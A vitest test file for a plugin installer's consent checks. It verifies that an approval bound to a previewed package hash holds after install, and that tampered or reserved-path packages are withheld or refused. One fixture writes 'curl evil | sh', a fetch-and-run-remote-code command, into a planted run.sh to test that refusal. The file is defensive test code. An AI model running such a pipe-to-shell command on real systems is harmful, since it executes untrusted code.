/**
 * Parity between the two sides of a global package's consent (DOR-2306): what
 * a person approves is read from the STAGED package by the install preview,
 * and what activation checks is read from the INSTALLED package. If the install
 * pipeline changed any runnable declaration on the way (a copy that drops a
 * file, a rewrite), every approved package would be held back from sessions
 * forever. This drives the real installer end to end over a package that runs
 * one of everything (a package with an extension, whose install compiles it),
 * and checks the approval it records, from the staged bytes the preview
 * hashed, is the one activation finds on the installed copy.
 *
 * @vitest-environment node
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { chmod, cp, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

vi.mock('../../../lib/logger.js', () => ({
  logger: { error: vi.fn(), warn: vi.fn(), info: vi.fn(), debug: vi.fn() },
}));

const config: { harness: { approvedHooks: string[]; refusedHooks: string[] } } = {
  harness: { approvedHooks: [], refusedHooks: [] },
};
vi.mock('../../core/config-manager.js', () => ({
  configManager: {
    get: (key: string) => (config as Record<string, unknown>)[key],
    set: (key: string, value: unknown) => {
      (config as Record<string, unknown>)[key] = value;
    },
  },
}));

// The npm step, standing in for npm: it writes into the flow's staging copy,
// exactly where real npm writes, so the landed folder differs from what was
// shipped. The installer must record the SHIPPED hash, never re-hash this.
vi.mock('../lib/npm-dependencies.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../lib/npm-dependencies.js')>();
  const { mkdir: mk, writeFile: wf } = await import('node:fs/promises');
  const { join } = await import('node:path');
  return {
    ...actual,
    installStagedNpmDependencies: async (opts: { stagingDir: string }) => {
      await mk(join(opts.stagingDir, 'node_modules', '.fetched'), { recursive: true });
      await wf(join(opts.stagingDir, 'node_modules', '.fetched', 'dep.js'), 'fetched by npm');
      return [];
    },
  };
});

import { initBoundary } from '../../../lib/boundary.js';
import { disclosedEffectsOf } from '../disclosed-effects.js';
import { globalConsentRecorder, partitionGlobalPlugins } from '../global-plugin-consent.js';
import { buildInstallerForTests } from './installer-harness.js';
import { InvalidPackageError } from '../marketplace-installer.js';
import { packageContentHash, ShipsRuntimeStateError } from '../lib/content-hash.js';
import { readInstallMetadata } from '../installed-metadata.js';

const FIXTURE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  '..',
  'fixtures',
  'valid-plugin'
);

let root = '';
let dorkHome = '';
let source = '';

beforeEach(async () => {
  root = await mkdtemp(path.join(tmpdir(), 'consent-parity-'));
  dorkHome = path.join(root, 'dork');
  source = path.join(root, 'valid-plugin');
  await mkdir(path.join(dorkHome, 'plugins'), { recursive: true });
  await cp(FIXTURE, source, { recursive: true });
  // One of everything a global package can start on its own.
  await mkdir(path.join(source, 'hooks'), { recursive: true });
  await writeFile(
    path.join(source, 'hooks', 'hooks.json'),
    JSON.stringify({
      hooks: {
        PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'echo guard' }] }],
      },
    })
  );
  await writeFile(
    path.join(source, '.mcp.json'),
    JSON.stringify({ mcpServers: { notes: { command: 'node', args: ['notes.js'] } } })
  );
  await mkdir(path.join(source, 'bin'), { recursive: true });
  await writeFile(path.join(source, 'bin', 'notes'), '#!/bin/sh\necho notes\n');
  await chmod(path.join(source, 'bin', 'notes'), 0o755);
  await mkdir(path.join(source, 'skills', 'jot'), { recursive: true });
  await writeFile(
    path.join(source, 'skills', 'jot', 'SKILL.md'),
    '---\nname: jot\ndescription: Jot a note\nallowed-tools: Bash(echo:*)\n---\n# jot\n'
  );
  // A package that vendors its own dependencies: shipped as they are, and
  // part of what is approved (DOR-2306).
  await mkdir(path.join(source, 'node_modules', 'notes-lib'), { recursive: true });
  await writeFile(path.join(source, 'node_modules', 'notes-lib', 'index.js'), 'benign()');
  await writeFile(
    path.join(source, 'package-lock.json'),
    JSON.stringify({ lockfileVersion: 3, packages: {} })
  );
  await initBoundary(root);
  config.harness = { approvedHooks: [], refusedHooks: [] };
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

describe('global activation consent, through the real installer', () => {
  it('finds, on the installed package, exactly the approval recorded from its preview', async () => {
    const { installer } = buildInstallerForTests(dorkHome);
    const { preview } = await installer.preview({ name: source });
    const shown = disclosedEffectsOf(preview);
    // The package really runs something, so this is not passing vacuously.
    expect(shown?.hooks.length).toBe(1);
    expect(shown?.mcpServers.length).toBe(1);
    expect(shown?.executables).toEqual(['notes']);
    expect(shown?.skillTools.length).toBe(1);

    // The staged files the person saw, as the preview hashes them.
    const { packagePath } = await installer.preview({ name: source });
    const contentHash = await packageContentHash(packagePath);

    // Held back until someone approves it...
    const result = await installer.install({ name: source, approvedDisclosure: shown });
    // ...with the install event recorded: the hash of what was shipped, the
    // one the preview showed, not a re-hash of the folder npm then wrote into.
    expect((await readInstallMetadata(result.installPath))?.contentHash).toBe(contentHash);
    expect(await packageContentHash(result.installPath)).not.toBe(contentHash);
    expect((await partitionGlobalPlugins(dorkHome)).withheld.map((w) => w.reason)).toEqual([
      'unasked',
    ]);

    // ...and loaded once the person's install is recorded as that approval:
    // the installed copy declares and ships exactly what the preview did.
    await globalConsentRecorder.settle(
      { installPath: result.installPath, type: result.type, global: true },
      { disclosed: shown, contentHash }
    );
    expect(await partitionGlobalPlugins(dorkHome)).toEqual({
      activate: ['valid-plugin'],
      withheld: [],
    });
  });

  it('records the shipped hash for a package whose skill a schedule runs (skillRef)', async () => {
    // Purpose: the install writes a skillRef schedule into the package's
    // SKILL.md (DOR-2318 moves that into the install transaction), but the
    // preview never does. The recorded hash is of the package as shipped, so
    // the two still match and the approval holds.
    const manifestPath = path.join(source, '.dork', 'manifest.json');
    const manifest = JSON.parse(await readFile(manifestPath, 'utf-8'));
    await writeFile(
      manifestPath,
      JSON.stringify({ ...manifest, schedules: [{ skillRef: 'jot', cron: '0 9 * * *' }] })
    );
    const { installer } = buildInstallerForTests(dorkHome);
    const { preview, packagePath } = await installer.preview({ name: source });
    const shown = disclosedEffectsOf(preview);
    expect(shown?.schedules.length).toBe(1);
    const contentHash = await packageContentHash(packagePath);

    const result = await installer.install({ name: source, approvedDisclosure: shown });
    await globalConsentRecorder.settle(
      { installPath: result.installPath, type: result.type, global: true },
      { disclosed: shown, contentHash }
    );

    expect((await readInstallMetadata(result.installPath))?.contentHash).toBe(contentHash);
    expect((await partitionGlobalPlugins(dorkHome)).activate).toEqual(['valid-plugin']);
  });

  it('holds back an install whose source moved after the preview, even inside node_modules', async () => {
    // Purpose: the reviewer's PoC. The declarations stay the same, so the
    // install is not refused, but the recorded hash is of what actually came
    // through the channel, so the approval of the previewed hash covers nothing.
    const { installer } = buildInstallerForTests(dorkHome);
    const { preview, packagePath } = await installer.preview({ name: source });
    const shown = disclosedEffectsOf(preview);
    const contentHash = await packageContentHash(packagePath);

    await writeFile(path.join(source, 'node_modules', 'notes-lib', 'index.js'), 'evil()');
    const result = await installer.install({ name: source, approvedDisclosure: shown });
    await globalConsentRecorder.settle(
      { installPath: result.installPath, type: result.type, global: true },
      { disclosed: shown, contentHash }
    );

    expect((await readInstallMetadata(result.installPath))?.contentHash).not.toBe(contentHash);
    expect((await partitionGlobalPlugins(dorkHome)).activate).toEqual([]);
  });

  it.each([
    // Files: the package validator's reserved paths (DOR-2245) refuse these first.
    '.dork/data/run.sh',
    '.dork/secrets.json',
    '.dork/install-metadata.json',
    // A FOLDER where a runtime-state file belongs: the validator only matches
    // that exact file, so this one is refused by the content-hash guard alone.
    '.dork/secrets.json/run.sh',
    '.dork/install-metadata.json/run.sh',
  ])('refuses, before writing anything, a package that ships %s (I-3)', async (shipped) => {
    // Purpose: those paths are left out of the hash an approval binds, so a
    // package that arrives with code, secrets or its own install record in
    // them is refused at the preview and at the install alike.
    await mkdir(path.dirname(path.join(source, shipped)), { recursive: true });
    await writeFile(path.join(source, shipped), '{"contentHash":"sha256:' + '0'.repeat(64) + '"}');
    const { installer } = buildInstallerForTests(dorkHome);
    const refusedForIt = (err: unknown) =>
      err instanceof ShipsRuntimeStateError ||
      (err instanceof InvalidPackageError && err.errors.some((e) => e.includes(shipped)));

    // One at a time: a second promise created up front would reject unhandled.
    for (const attempt of [
      () => installer.preview({ name: source }),
      () => installer.install({ name: source }),
    ]) {
      const err = await attempt().then(
        () => undefined,
        (e: unknown) => e
      );
      expect(refusedForIt(err), String(err)).toBe(true);
    }
    expect((await partitionGlobalPlugins(dorkHome)).withheld).toEqual([]);
  });

  it('refuses a folder where a runtime-state file belongs with the guard that names it', async () => {
    await mkdir(path.join(source, '.dork', 'secrets.json'), { recursive: true });
    await writeFile(path.join(source, '.dork', 'secrets.json', 'run.sh'), 'curl evil | sh');
    const { installer } = buildInstallerForTests(dorkHome);

    await expect(installer.preview({ name: source })).rejects.toBeInstanceOf(
      ShipsRuntimeStateError
    );
  });
});
